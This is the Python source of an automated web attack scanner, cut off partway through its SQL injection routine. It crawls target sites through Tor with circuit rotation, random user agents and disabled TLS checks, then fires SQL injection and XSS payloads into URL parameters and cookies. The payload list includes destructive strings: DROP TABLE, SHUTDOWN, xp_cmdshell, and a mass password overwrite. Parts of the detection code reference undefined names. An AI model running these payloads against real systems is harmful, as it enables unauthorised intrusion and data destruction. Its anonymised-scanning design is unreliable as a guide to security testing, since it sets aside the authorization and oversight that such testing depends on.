import requests
from bs4 import BeautifulSoup
import threading
import urllib.parse
from collections import deque
from urllib.parse import urlparse, parse_qs, urlencode
import time
import random
import socks
import socket
from stem import Signal
from stem.control import Controller
import os
from tqdm import tqdm
import logging
import sys
from datetime import datetime
import json
from typing import Dict, List, Tuple, Optional, Any, Pattern
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning
import ssl
import re
import argparse
import numpy as np
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.preprocessing import StandardScaler
import joblib
import hashlib
from collections import defaultdict
from sklearn.feature_extraction.text import TfidfVectorizer
import websockets
import asyncio
from http.cookiejar import LWPCookieJar
import yaml
from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_socketio import SocketIO, emit
import plotly.graph_objects as go
import plotly.express as px
from threading import Thread

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Configure logging
def setup_logging():
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = os.path.join(log_dir, f"scan_{timestamp}.log")
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    return log_file

# Initialize logging
log_file = setup_logging()
logger = logging.getLogger(__name__)

# Configuration management
class Config:
    def __init__(self):
        self.config_file = "config.json"
        self.default_config = {
            "max_threads": 3,
            "max_retries": 3,
            "max_depth": 2,
            "timeout": 30,
            "delay_between_requests": 1,
            "verify_ssl": False,
            "rate_limit": {
                "requests_per_minute": 60,
                "burst_size": 10
            },
            "proxy": {
                "enabled": True,
                "tor_proxy": "socks5h://localhost:9050",
                "use_rotating_proxies": True
            },
            "scan_options": {
                "test_sqli": True,
                "test_xss": True,
                "test_path_traversal": False,
                "test_file_inclusion": False
            },
            "ml_detection": {
                "enabled": True,
                "model_type": "random_forest",
                "confidence_threshold": 0.85,
                "training_data_size": 1000
            },
            "real_time_reporting": {
                "enabled": True,
                "websocket_port": 8765,
                "update_interval": 1.0,
                "max_history": 1000
            },
            "dashboard": {
                "enabled": True,
                "host": "0.0.0.0",
                "port": 5000,
                "debug": False,
                "theme": "dark",
                "refresh_interval": 1.0,
                "max_data_points": 100,
                "charts": {
                    "vulnerability_distribution": True,
                    "scan_progress": True,
                    "response_times": True,
                    "error_rates": True
                }
            },
            "payload_generation": {
                "enabled": True,
                "max_payloads": 50,
                "technology_detection": True,
                "adaptive_encoding": True
            },
            "cookie_handling": {
                "enabled": True,
                "cookie_file": "cookies.txt",
                "session_persistence": True,
                "cookie_manipulation": True
            },
            "custom_signatures": {
                "enabled": True,
                "signature_file": "signatures.yml",
                "auto_update": True,
                "max_signatures": 1000
            }
        }
        self.config = self.load_config()

    def load_config(self) -> dict:
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    user_config = json.load(f)
                    return {**self.default_config, **user_config}
            except json.JSONDecodeError:
                logger.error("Invalid config file. Using default configuration.")
                return self.default_config
        return self.default_config

    def save_config(self):
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)

# Rate limiting
class RateLimiter:
    def __init__(self, requests_per_minute: int, burst_size: int):
        self.requests_per_minute = requests_per_minute
        self.burst_size = burst_size
        self.tokens = burst_size
        self.last_update = time.time()
        self.lock = threading.Lock()

    def acquire(self):
        with self.lock:
            now = time.time()
            time_passed = now - self.last_update
            self.tokens = min(
                self.burst_size,
                self.tokens + time_passed * (self.requests_per_minute / 60)
            )
            self.last_update = now

            if self.tokens >= 1:
                self.tokens -= 1
                return True
            return False

    def wait(self):
        while not self.acquire():
            time.sleep(0.1)

# Initialize configuration and rate limiter
config = Config()
rate_limiter = RateLimiter(
    config.config["rate_limit"]["requests_per_minute"],
    config.config["rate_limit"]["burst_size"]
)

# Initialize global response analyzer
response_analyzer = None

vulnerability_results = {
    "sqli": {
        "error-based": [],
        "time-based": [],
        "boolean/union-based": []
    },
    "xss": [],
    "ml_detected": [],
    "custom_signatures": []
}

# Configure Tor proxy
TOR_PROXY = "socks5h://localhost:9050"  # Use "socks5h" for DNS resolution through Tor

# Define vulnerability payloads
PAYLOADS = {
    "SQLi": [
        # Basic SQLi payloads
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 'a'='a",
        "' OR 1=1#",
        "' OR '1'='1' --",
        "' OR '1'='1'#",
        "' OR 1=1; --",
        "' OR 1=1;#",
        # Error-based SQLi
        "' OR 1=CONVERT(int, (SELECT @@version)) --",
        "' OR 1/0 --",  # Division by zero
        "' OR @@version --",
        "' OR 'x'='x' AND EXTRACTVALUE(1, concat(0x7e,(SELECT @@version))) --",
        # Union-based SQLi
        "' UNION SELECT null, null --",
        "' UNION SELECT username, password FROM users --",
        "' UNION ALL SELECT null, null, null --",
        "' UNION SELECT 1, database(), version() --",
        "' UNION SELECT 1, user(), @@datadir --",
        "' ORDER BY 1 --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 1, table_name, null FROM information_schema.tables --",
        "' UNION SELECT 1, column_name, null FROM information_schema.columns --",
        # Boolean-based Blind SQLi
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND substring(database(),1,1)='a' --",
        "' AND (SELECT length(database()))=5 --",
        "' AND ascii(substring((SELECT database()),1,1))=97 --",
        "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --",
        "' AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END) --",
        # Time-based Blind SQLi
        "' AND SLEEP(5) --",
        "' AND 1=IF(2>1,SLEEP(5),0) --",
        "' AND 1=IF(2<1,SLEEP(5),0) --",
        "' OR IF(1=1,SLEEP(5),0) --",
        "' AND BENCHMARK(1000000,MD5(1)) --",
        "' AND (SELECT * FROM (SELECT SLEEP(5))a) --",
        "' WAITFOR DELAY '0:0:5' --",  # MSSQL specific
        "' AND pg_sleep(5) --",  # PostgreSQL specific
        "' AND sleep(5)=0 --",  # MySQL specific
        # More advanced SQLi payloads
        "'; DROP TABLE users; --",
        "'; SHUTDOWN; --",
        "'; EXEC xp_cmdshell 'dir' --",  # MSSQL specific
        "' OR EXISTS(SELECT * FROM users) --",
        "' HAVING 1=1 --",
        "' GROUP BY 1 --",
        "' AND 1 in (SELECT @@version) --",
        "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "' AND SUBSTRING((SELECT version()),1,1)='5' --",
        "' OR 1=(SELECT 1 FROM dual) --",  # Oracle specific
        # Escaped and encoded variations
        "'' OR ''1''=''1",
        "'%20OR%201=1--",
        "'+OR+1=1--",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        # Multi-statement attempts
        "'; SELECT * FROM users; --",
        "'; UPDATE users SET password='hacked'; --",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'pass'); --",
        # Additional database-specific payloads
        "' OR sqlite_version() --",  # SQLite specific
        "' AND 1=cast('1' as int) --",  # Type conversion errors
        "' AND ROW_COUNT() > 0 --",  # MySQL specific
        "' OR 1=DBMS_UTILITY.SQLID_TO_SQLHASH('test') --"  # Oracle specific
    ],
    "XSS": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>"
    ]
}

# List of UserAgent headers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

# Track tested URLs and parameters to avoid duplicates
tested_urls = set()

# Store responses for anomaly detection model training
training_data = []

# Add new class for cookie handling
class CookieManager:
    def __init__(self, cookie_file: str):
        self.cookie_file = cookie_file
        self.cookie_jar = LWPCookieJar(cookie_file)
        self.session_cookies = {}
        
    def load_cookies(self):
        """Load cookies from file."""
        try:
            self.cookie_jar.load(ignore_discard=True)
            logger.info(f"Loaded cookies from {self.cookie_file}")
        except Exception as e:
            logger.warning(f"Failed to load cookies: {e}")
            
    def save_cookies(self):
        """Save cookies to file."""
        try:
            self.cookie_jar.save(ignore_discard=True)
            logger.info(f"Saved cookies to {self.cookie_file}")
        except Exception as e:
            logger.warning(f"Failed to save cookies: {e}")
            
    def get_cookies(self, domain: str) -> Dict[str, str]:
        """Get cookies for a specific domain."""
        return {cookie.name: cookie.value for cookie in self.cookie_jar if domain in cookie.domain}
        
    def set_cookie(self, domain: str, name: str, value: str):
        """Set a cookie for a domain."""
        self.session_cookies[domain] = self.session_cookies.get(domain, {})
        self.session_cookies[domain][name] = value
        
    def manipulate_cookies(self, domain: str) -> List[Dict[str, str]]:
        """Generate cookie manipulation attempts."""
        cookies = self.get_cookies(domain)
        manipulations = []
        
        # Try different cookie values
        for name, value in cookies.items():
            # Try empty value
            manipulations.append({name: ''})
            
            # Try special characters
            manipulations.append({name: value + "'"})
            manipulations.append({name: value + '"'})
            
            # Try SQL injection in cookie
            manipulations.append({name: value + "' OR '1'='1"})
            
            # Try XSS in cookie
            manipulations.append({name: value + "<script>alert(1)</script>"})
            
        return manipulations

# Add new class for dynamic payload generation
class DynamicPayloadGenerator:
    def __init__(self):
        self.technology_stack = {}
        self.payload_templates = {
            'sql': {
                'mysql': [
                    "' OR '1'='1",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' AND SLEEP(5)--"
                ],
                'postgresql': [
                    "' OR '1'='1",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' AND pg_sleep(5)--"
                ],
                'mssql': [
                    "' OR '1'='1",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' WAITFOR DELAY '0:0:5'--"
                ]
            },
            'xss': {
                'basic': [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>"
                ],
                'advanced': [
                    "<svg/onload=alert(1)>",
                    "<body onload=alert(1)>"
                ]
            }
        }
    
    def detect_technology(self, response: requests.Response) -> Dict[str, str]:
        """Detect technology stack from response headers and content."""
        tech_stack = {}
        
        # Check server header
        server = response.headers.get('Server', '').lower()
        if 'apache' in server:
            tech_stack['server'] = 'apache'
        elif 'nginx' in server:
            tech_stack['server'] = 'nginx'
        elif 'iis' in server:
            tech_stack['server'] = 'iis'
            
        # Check content type
        content_type = response.headers.get('Content-Type', '').lower()
        if 'php' in content_type:
            tech_stack['language'] = 'php'
        elif 'asp' in content_type:
            tech_stack['language'] = 'asp'
        elif 'jsp' in content_type:
            tech_stack['language'] = 'jsp'
            
        # Check for framework-specific patterns
        content = response.text.lower()
        if 'laravel' in content:
            tech_stack['framework'] = 'laravel'
        elif 'django' in content:
            tech_stack['framework'] = 'django'
        elif 'spring' in content:
            tech_stack['framework'] = 'spring'
            
        return tech_stack
    
    def generate_payloads(self, response: requests.Response, vuln_type: str) -> List[str]:
        """Generate payloads based on detected technology and vulnerability type."""
        if not self.technology_stack:
            self.technology_stack = self.detect_technology(response)
            
        payloads = []
        
        if vuln_type == 'sql':
            # Generate SQL injection payloads based on detected database
            db_type = self.technology_stack.get('language', 'mysql')
            payloads.extend(self.payload_templates['sql'].get(db_type, self.payload_templates['sql']['mysql']))
            
        elif vuln_type == 'xss':
            # Generate XSS payloads based on content type and framework
            if 'text/html' in response.headers.get('Content-Type', '').lower():
                payloads.extend(self.payload_templates['xss']['basic'])
                if self.technology_stack.get('framework'):
                    payloads.extend(self.payload_templates['xss']['advanced'])
                    
        return payloads

# Add new class for custom vulnerability signatures
class SignatureManager:
    def __init__(self, signature_file: str):
        self.signature_file = signature_file
        self.signatures = {
            'sql': [],
            'xss': [],
            'custom': []
        }
        self.load_signatures()
        
    def load_signatures(self):
        """Load signatures from YAML file."""
        try:
            if os.path.exists(self.signature_file):
                with open(self.signature_file, 'r') as f:
                    data = yaml.safe_load(f)
                    self.signatures.update(data)
                logger.info(f"Loaded {len(self.signatures)} signatures from {self.signature_file}")
            else:
                logger.info("No signature file found. Using default signatures.")
        except Exception as e:
            logger.error(f"Failed to load signatures: {e}")
            
    def save_signatures(self):
        """Save signatures to YAML file."""
        try:
            with open(self.signature_file, 'w') as f:
                yaml.dump(self.signatures, f)
            logger.info(f"Saved signatures to {self.signature_file}")
        except Exception as e:
            logger.error(f"Failed to save signatures: {e}")
            
    def add_signature(self, category: str, pattern: str, description: str):
        """Add a new signature."""
        if category not in self.signatures:
            self.signatures[category] = []
            
        self.signatures[category].append({
            'pattern': pattern,
            'description': description,
            'compiled': re.compile(pattern, re.IGNORECASE)
        })
        
        if len(self.signatures[category]) > config.config["custom_signatures"]["max_signatures"]:
            logger.warning(f"Maximum number of signatures reached for {category}")
            
    def check_signatures(self, response: requests.Response, content: str) -> List[Dict]:
        """Check response against all signatures."""
        matches = []
        
        for category, sigs in self.signatures.items():
            for sig in sigs:
                if sig['compiled'].search(content):
                    matches.append({
                        'category': category,
                        'pattern': sig['pattern'],
                        'description': sig['description']
                    })
                    
        return matches

# Add new class for ML-based detection
class MLDetector:
    def __init__(self):
        self.model = RandomForestClassifier(n_estimators=100)
        self.vectorizer = TfidfVectorizer(max_features=1000)
        self.is_trained = False
        self.training_data = []
        self.labels = []
        
    def extract_features(self, response):
        features = {
            'status_code': response.status_code,
            'content_length': len(response.text),
            'header_count': len(response.headers),
            'error_patterns': self._extract_error_patterns(response.text),
            'response_time': response.elapsed.total_seconds(),
            'content_type': response.headers.get('Content-Type', ''),
            'security_headers': self._check_security_headers(response.headers)
        }
        return features
    
    def _extract_error_patterns(self, content):
        patterns = [
            r'sql syntax',
            r'mysql_fetch',
            r'syntax error',
            r'oracle error',
            r'postgresql error',
            r'mssql error',
            r'stack trace',
            r'undefined index',
            r'undefined variable'
        ]
        return sum(1 for pattern in patterns if re.search(pattern, content.lower()))
    
    def _check_security_headers(self, headers):
        security_headers = [
            'X-Frame-Options',
            'X-XSS-Protection',
            'X-Content-Type-Options',
            'Strict-Transport-Security',
            'Content-Security-Policy'
        ]
        return sum(1 for header in security_headers if header in headers)
    
    def train(self, responses, labels):
        if len(responses) < 10:
            logger.warning("Not enough training data for ML model")
            return
            
        features = [self.extract_features(response) for response in responses]
        X = self.vectorizer.fit_transform([str(f) for f in features])
        self.model.fit(X, labels)
        self.is_trained = True
        logger.info("ML model trained successfully")
    
    def predict(self, response):
        if not self.is_trained:
            return False, 0.0
            
        features = self.extract_features(response)
        X = self.vectorizer.transform([str(features)])
        proba = self.model.predict_proba(X)[0]
        return proba[1] > 0.5, proba[1]

# Add new class for real-time reporting
class RealTimeReporter:
    def __init__(self):
        self.websocket = None
        self.clients = set()
        self.scan_stats = {
            'total_urls': 0,
            'tested_urls': 0,
            'vulnerabilities': [],
            'start_time': datetime.now().isoformat(),  # Store as ISO format string
            'current_url': '',
            'progress': 0
        }
        self.lock = asyncio.Lock()
        
    async def start_server(self):
        server = await websockets.serve(self.handle_client, "localhost", 8765)
        logger.info("Real-time reporting server started on port 8765")
        return server
        
    async def handle_client(self, websocket, path):
        self.clients.add(websocket)
        try:
            await websocket.send(json.dumps(self.scan_stats))
            async for message in websocket:
                # Handle client messages if needed
                pass
        finally:
            self.clients.remove(websocket)
            
    async def update_stats(self, new_stats):
        async with self.lock:
            self.scan_stats.update(new_stats)
            if 'start_time' in self.scan_stats and isinstance(self.scan_stats['start_time'], datetime):
                self.scan_stats['start_time'] = self.scan_stats['start_time'].isoformat()
            
            # Broadcast to all connected clients
            try:
                message = json.dumps(self.scan_stats)
                for client in list(self.clients):  # Create a copy of the set to avoid modification during iteration
                    try:
                        await client.send(message)
                    except websockets.exceptions.ConnectionClosed:
                        self.clients.remove(client)
                    except Exception as e:
                        logger.error(f"Failed to send update to client: {e}")
            except Exception as e:
                logger.error(f"Failed to broadcast update: {e}")

# Update the WebDashboard class
class WebDashboard:
    def __init__(self):
        self.app = Flask(__name__)
        self.socketio = SocketIO(self.app, cors_allowed_origins="*", async_mode='threading')
        self.scan_data = {
            'total_urls': 0,
            'tested_urls': 0,
            'current_url': '',
            'vulnerabilities': [],
            'progress': 0,
            'response_times': [],
            'error_rates': [],
            'vulnerability_distribution': {},
            'start_time': None,
            'estimated_time_remaining': None,
            'scan_status': 'waiting',  # waiting, running, completed, error
            'last_update': time.time(),
            'report_path': None  # Store the report path when generated
        }
        self.setup_routes()
        self._last_update = time.time()
        self.update_interval = 1.0  # Update interval in seconds
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return render_template('index.html')
        
        @self.app.route('/api/stats')
        def get_stats():
            return jsonify(self.scan_data)
        
        @self.app.route('/api/vulnerabilities')
        def get_vulnerabilities():
            return jsonify(self.scan_data['vulnerabilities'])
            
        @self.app.route('/report/<path:report_name>')
        def serve_report(report_name):
            return send_from_directory('reports', report_name)
        
        @self.socketio.on('connect')
        def handle_connect():
            logger.info("Client connected to dashboard")
            emit('initial_data', self.scan_data)
        
        @self.socketio.on('disconnect')
        def handle_disconnect():
            logger.info("Client disconnected from dashboard")
    
    def update_data(self, new_data):
        """Update scan data and emit to connected clients"""
        try:
            current_time = time.time()
            
            # Only update if enough time has passed since last update
            if current_time - self._last_update >= self.update_interval:
                # Update scan data
                self.scan_data.update(new_data)
                
                # Initialize start time if not set
                if not self.scan_data['start_time'] and self.scan_data['scan_status'] == 'running':
                    self.scan_data['start_time'] = current_time
                
                # Calculate progress and estimated time remaining
                if self.scan_data['total_urls'] > 0:
                    self.scan_data['progress'] = min((self.scan_data['tested_urls'] / self.scan_data['total_urls']) * 100, 100)
                    
                    if self.scan_data['start_time'] and self.scan_data['progress'] > 0:
                        elapsed_time = current_time - self.scan_data['start_time']
                        estimated_total_time = elapsed_time / (self.scan_data['progress'] / 100)
                        self.scan_data['estimated_time_remaining'] = max(0, estimated_total_time - elapsed_time)
                
                # Update vulnerability distribution
                vuln_dist = {}
                for vuln in self.scan_data['vulnerabilities']:
                    vuln_type = vuln.get('type', 'Unknown')
                    vuln_dist[vuln_type] = vuln_dist.get(vuln_type, 0) + 1
                self.scan_data['vulnerability_distribution'] = vuln_dist
                
                # Check if scan is complete
                if self.scan_data['progress'] >= 100 or self.scan_data['tested_urls'] >= self.scan_data['total_urls']:
                    self.scan_data['scan_status'] = 'completed'
                    self.scan_data['estimated_time_remaining'] = 0
                
                # Emit update to all connected clients
                try:
                    self.socketio.emit('update_data', self.scan_data, namespace='/')
                    logger.debug(f"Dashboard data updated: Progress {self.scan_data['progress']:.1f}%, "
                               f"Tested {self.scan_data['tested_urls']}/{self.scan_data['total_urls']} URLs, "
                               f"Status: {self.scan_data['scan_status']}")
                except Exception as e:
                    logger.error(f"Failed to emit dashboard update: {e}")
                
                self._last_update = current_time
                self.scan_data['last_update'] = current_time
        except Exception as e:
            logger.error(f"Error updating dashboard data: {e}")
            self.scan_data['scan_status'] = 'error'
    
    def set_report_path(self, report_path):
        """Set the report path and notify clients"""
        self.scan_data['report_path'] = os.path.basename(report_path)
        self.socketio.emit('update_data', self.scan_data, namespace='/')
    
    def start(self):
        """Start the Flask server in a separate thread"""
        if config.config["dashboard"]["enabled"]:
            def run_server():
                try:
                    host = config.config["dashboard"]["host"]
                    port = config.config["dashboard"]["port"]
                    logger.info(f"Starting dashboard at http://{host}:{port}")
                    self.socketio.run(
                        self.app,
                        host=host,
                        port=port,
                        debug=config.config["dashboard"]["debug"],
                        use_reloader=False,
                        allow_unsafe_werkzeug=True
                    )
                except Exception as e:
                    logger.error(f"Failed to start dashboard: {e}")
            
            thread = Thread(target=run_server)
            thread.daemon = True
            thread.start()
            logger.info(f"Dashboard started at http://{config.config['dashboard']['host']}:{config.config['dashboard']['port']}")

# Move SessionManager class here, after all other class definitions
class SessionManager:
    def __init__(self):
        self.sessions = []
        self.current_session_index = 0
        self.error_counts = defaultdict(int)
        self.rate_limiter = RateLimiter(requests_per_minute=30, burst_size=5)  # Reduced rate
        self.last_error_time = {}
        self.cooldown_periods = {}
        self.cookie_manager = CookieManager(config.config["cookie_handling"]["cookie_file"])
        self.payload_generator = DynamicPayloadGenerator()
        self.signature_manager = SignatureManager(config.config["custom_signatures"]["signature_file"])

    def get_session(self) -> requests.Session:
        if not self.sessions:
            self.sessions.append(self._create_session())
        return self.sessions[self.current_session_index]

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        
        # Configure proxy if enabled
        if config.config["proxy"]["enabled"]:
            session.proxies = {
                "http": config.config["proxy"]["tor_proxy"],
                "https": config.config["proxy"]["tor_proxy"]
            }
        
        # Configure SSL verification
        session.verify = config.config["verify_ssl"]
        
        # Configure retry strategy with exponential backoff
        retry_strategy = requests.adapters.Retry(
            total=config.config["max_retries"],
            backoff_factor=2,  # Exponential backoff
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "HEAD", "OPTIONS"],
            respect_retry_after_header=True
        )
        adapter = requests.adapters.HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Configure cookie handling
        if config.config["cookie_handling"]["enabled"]:
            session.cookies = self.cookie_manager.cookie_jar
        
        return session

    def increment_error_count(self, url: str):
        """Track errors and implement exponential backoff"""
        self.error_counts[url] += 1
        current_time = time.time()
        
        # If this is the first error or we've passed the cooldown period
        if url not in self.last_error_time or (current_time - self.last_error_time[url]) > self.cooldown_periods.get(url, 0):
            self.cooldown_periods[url] = min(300, 2 ** self.error_counts[url])  # Max 5 minute cooldown
            self.last_error_time[url] = current_time

    def should_skip_url(self, url: str) -> bool:
        """Determine if we should skip testing this URL based on error history"""
        if self.error_counts[url] >= 3:  # If we've had 3 or more errors
            current_time = time.time()
            last_error = self.last_error_time.get(url, 0)
            cooldown = self.cooldown_periods.get(url, 0)
            
            if current_time - last_error < cooldown:
                return True  # Still in cooldown period
            else:
                # Reset error count after cooldown
                self.error_counts[url] = 0
                return False
        return False

    def rotate_proxy(self):
        if config.config["proxy"]["enabled"] and config.config["proxy"]["use_rotating_proxies"]:
            try:
                with Controller.from_port(port=9051) as controller:
                    controller.authenticate()
                    controller.signal(Signal.NEWNYM)
                logger.info("Successfully rotated Tor circuit")
            except Exception as e:
                logger.error(f"Failed to rotate Tor circuit: {e}")

    def get_payloads(self, response: requests.Response, vuln_type: str) -> List[str]:
        """Get dynamically generated payloads."""
        if config.config["payload_generation"]["enabled"]:
            return self.payload_generator.generate_payloads(response, vuln_type)
        return []

    def check_custom_signatures(self, response: requests.Response) -> List[Dict]:
        """Check response against custom signatures."""
        if config.config["custom_signatures"]["enabled"]:
            return self.signature_manager.check_signatures(response, response.text)
        return []

# Initialize session manager after all class definitions
session_manager = SessionManager()

def get_random_user_agent() -> str:
    """Return a random User-Agent string."""
    return random.choice(USER_AGENTS)

def make_request(url: str, method: str = "GET", **kwargs) -> Optional[requests.Response]:
    """Make an HTTP request with rate limiting and error handling."""
    global training_data  # Use the global training_data list
    
    if session_manager.should_skip_url(url):
        logger.warning(f"Skipping {url} due to too many errors")
        return None

    rate_limiter.wait()
    session = session_manager.get_session()
    
    try:
        if "headers" not in kwargs:
            kwargs["headers"] = {}
        kwargs["headers"]["User-Agent"] = get_random_user_agent()
        kwargs["timeout"] = config.config["timeout"]
        
        start_time = time.time()
        response = session.request(method, url, **kwargs)
        elapsed_time = time.time() - start_time
        response.raise_for_status()
        
        # Collect training data for anomaly detection
        # Only collect during initial crawl (no payloads in URL)
        if (hasattr(response, 'text') and 
            'text/html' in response.headers.get('Content-Type', '').lower() and
            not any(payload in url for payload in PAYLOADS["SQLi"] + PAYLOADS["XSS"]) and
            not any(payload in str(kwargs.get('data', '')) for payload in PAYLOADS["SQLi"] + PAYLOADS["XSS"])):
            training_data.append((response, elapsed_time))
            logger.debug(f"Collected baseline data from {url}")
        
        return response
    except requests.exceptions.RequestException as e:
        session_manager.increment_error_count(url)
        logger.error(f"Request failed for {url}: {e}")
        return None

def crawl(start_url: str, max_depth: int = 2) -> List[str]:
    """Crawl the website to find all internal links with improved error handling."""
    visited = set()
    queue = deque([(start_url, 0)])
    links = []
    session = session_manager.get_session()
    
    with tqdm(desc="Crawling URLs", unit="url") as pbar:
        while queue:
            url, depth = queue.popleft()
            if url in visited or depth > max_depth:
                continue
            visited.add(url)
            
            try:
                response = make_request(url)
                if not response:
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    full_url = urllib.parse.urljoin(url, link['href'])
                    if full_url.startswith(start_url) and full_url not in visited:
                        queue.append((full_url, depth + 1))
                        links.append(full_url)
                        logger.debug(f"Found link: {full_url}")
            except Exception as e:
                logger.error(f"Failed to crawl {url}: {e}")
            finally:
                pbar.update(1)
    
    return links

def get_baseline_response(url, session, headers):
    """Fetch the original response for comparison."""
    try:
        response = session.get(url, headers=headers, timeout=30)
        return response  # Return the actual response object instead of a dictionary
    except requests.RequestException as e:
        logger.error(f"Failed to get baseline for {url}: {e}")
        return None

def is_vulnerable(baseline: Optional[requests.Response], response: requests.Response, elapsed_time: float, payload: str) -> Optional[str]:
    """Check if the response indicates a vulnerability with improved detection."""
    if not response:
        return None

    content = response.text.lower()
    status_code = response.status_code
    
    # Check custom signatures first
    if config.config["custom_signatures"]["enabled"]:
        signature_matches = session_manager.check_custom_signatures(response)
        if signature_matches:
            logger.info(f"Found custom signature matches: {signature_matches}")
            return signature_matches[0]['category']
    
    # SQL Injection detection patterns
    sql_errors = {
        "sql syntax": "SQL syntax error",
        "mysql_fetch": "MySQL fetch error",
        "syntax error": "Syntax error",
        "unexpected token": "Unexpected token",
        "error in your sql": "SQL error",
        "warning: mysql": "MySQL warning",
        "oracle error": "Oracle error",
        "postgresql error": "PostgreSQL error",
        "sqlite error": "SQLite error",
        "mssql error": "MSSQL error"
    }
    
    # XSS detection patterns
    xss_patterns = [
        r"<script>.*?</script>",
        r"javascript:.*?",
        r"onerror=.*?",
        r"onload=.*?",
        r"onclick=.*?"
    ]

    # Check for SQL Injection vulnerabilities
    if any(error in content for error in sql_errors.keys()):
        logger.info(f"Found SQL error: {sql_errors[error]}")
        return "error-based"

    # Time-based detection
    if "SLEEP" in payload.upper() and elapsed_time > 5:
        logger.info(f"Time-based vulnerability detected with {elapsed_time}s delay")
        return "time-based"

    # Boolean/Union-based detection
    if baseline and status_code == 200:
        baseline_len = len(baseline.text)
        response_len = len(response.text)
        content_diff = abs(response_len - baseline_len)
        
        # Check for significant content changes
        if response_len > baseline_len * 1.5 or (response_len > baseline_len and "SELECT" in payload.upper()):
            logger.info(f"Content length changed from {baseline_len} to {response_len}")
            return "boolean/union-based"
        
        # Check for specific SQL keywords in response
        sql_keywords = ["select", "union", "from", "where", "and", "or", "order by", "group by"]
        if any(keyword in content for keyword in sql_keywords):
            logger.info("Found SQL keywords in response")
            return "boolean/union-based"

    # XSS detection
    if any(re.search(pattern, content, re.IGNORECASE) for pattern in xss_patterns):
        logger.info("Found XSS pattern in response")
        return "xss"

    # ML-based Anomaly Detection
    if config.config["ml_detection"]["enabled"] and ml_detector and ml_detector.is_trained:
        is_anomaly, probability = ml_detector.predict(response)
        if is_anomaly and probability < config.config["ml_detection"]["confidence_threshold"]:
            logger.info(f"ML detected anomaly with probability {probability:.2f}")
            # If the anomaly is significant and we're testing with a payload
            if "SQL" in payload.upper():
                return "boolean/union-based"
            elif "XSS" in payload.upper():
                return "xss"

    # Response Analyzer Anomaly Detection
    is_anomaly, probability = response_analyzer.predict(response, elapsed_time)
    if is_anomaly:
        logger.info(f"Response analyzer detected anomaly with probability {probability:.2f}")
        # If the anomaly is significant and we're testing with a payload
        if probability < 0.3 and payload:
            if "SQL" in payload.upper():
                return "boolean/union-based"
            elif "XSS" in payload.upper():
                return "xss"

    return None

def test_sqli(url):
    """Test SQL injection vulnerabilities in a URL."""
    global current_url
    current_url = url
    
    if session_manager.should_skip_url(url):
        logger.info(f"Skipping {url} due to previous errors")
        return

    try:
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        session = session_manager.get_session()
        headers = {"User-Agent": get_random_user_agent()}
        
        # Wait for rate limiter before making request
        session_manager.rate_limiter.wait()
        
        # Get baseline response for technology detection
        baseline = get_baseline_response(url, session, headers) if query_params else None
        if baseline:
            # Detect technology stack
            tech_stack = session_manager.payload_generator.detect_technology(baseline)
            logger.debug(f"Detected technology stack: {tech_stack}")

        if query_params:
            for param in query_params:
                # Test each parameter but stop as soon as we find a vulnerability
                vulnerability_found = False
                
                # Get dynamically generated payloads based on technology
                if baseline:
                    payloads = session_manager.payload_generator.generate_payloads(baseline, 'sql')
                else:
                    payloads = PAYLOADS["SQLi"]  # Fallback to default payloads
                
                for payload in payloads:
                    if session_manager.should_skip_url(url):
                        return
                        
                    test_params = query_params.copy()
                    test_params[param] = payload
                    test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                    
                    try:
                        session_manager.rate_limiter.wait()
                        start_time = time.time()
                        response = session.get(test_url, headers=headers, timeout=10)
                        elapsed_time = time.time() - start_time
                        
                        if response.status_code == 500:
                            session_manager.increment_error_count(url)
                            continue
                            
                        vuln_type = is_vulnerable(baseline, response, elapsed_time, payload)
                        if vuln_type:
                            logger.info(f"{vuln_type.capitalize()} SQLi vulnerability found in {param} at {test_url}")
                            vulnerability_results["sqli"][vuln_type].append((test_url, param))
                            vulnerability_found = True
                            break  # Stop testing more payloads for this parameter once we find a vulnerability
                            
                    except requests.RequestException as e:
                        logger.error(f"Request failed for {test_url}: {str(e)}")
